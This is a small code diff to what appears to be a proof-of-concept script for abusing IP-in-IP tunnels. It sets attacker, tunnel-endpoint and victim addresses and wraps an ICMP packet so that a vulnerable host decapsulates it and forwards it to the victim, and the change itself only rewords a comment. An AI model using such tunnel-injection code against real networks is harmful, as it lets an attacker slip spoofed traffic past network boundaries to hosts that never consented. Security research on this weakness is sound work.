@@ -18,7 +18,7 @@ def construct_ipip_packet(src_ip, dst_ip, inner_packet): #Encapsulates the inner
 
 if __name__ == '__main__':
     attacker_ip = '192.168.1.2' #Your IP
-    tunnel_interface = '192.168.2.2' #IP of attacked host, needs to have a tunnel configured
+    tunnel_interface = '192.168.2.2' #IP of the attacked host, needs to have a tunnel configured
     tunnel_exit = '192.168.10.2' #IP of the attacked host, where tunnel traffic is directed to
     victim_ip = '192.168.10.3' #Victim in the tunneled network, where you want the tunneled traffic to be sent
     inner_packet = construct_icmp_packet(tunnel_exit,victim_ip) #Inner packet, that the vulnerable host decapsulates
